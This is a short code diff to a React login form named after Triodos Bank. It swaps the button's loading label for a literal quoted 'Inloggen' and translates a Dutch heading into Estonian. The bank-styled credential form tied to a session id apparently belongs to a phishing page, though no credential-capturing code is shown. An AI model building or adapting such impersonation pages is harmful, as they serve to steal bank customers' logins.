@@ -93,7 +93,7 @@ export function TriodosBankClient({ sessionId }: { sessionId: string }) {
               disabled={saving || !username || !password} 
               className="bg-[#98D898] text-[#2C0044] font-bold py-3 px-8 rounded-full hover:bg-[#86c986] disabled:opacity-50 transition-colors"
             >
-              {saving ? "Laden..." : "Inloggen"}
+              "Inloggen"
             </button>
           </div>
         </form>
@@ -101,7 +101,7 @@ export function TriodosBankClient({ sessionId }: { sessionId: string }) {
 
       {/* Alternative Login Options */}
       <div className="w-full max-w-[640px]">
-        <h3 className="text-[16px] font-bold text-[#2C0044] mb-4">Anders inloggen?</h3>
+        <h3 className="text-[16px] font-bold text-[#2C0044] mb-4">Teine sisselogimisviis?</h3>
         
         <div className="space-y-3">
           <button className="w-full bg-white rounded-lg p-5 flex items-center justify-between shadow-sm hover:shadow-md transition-shadow group">
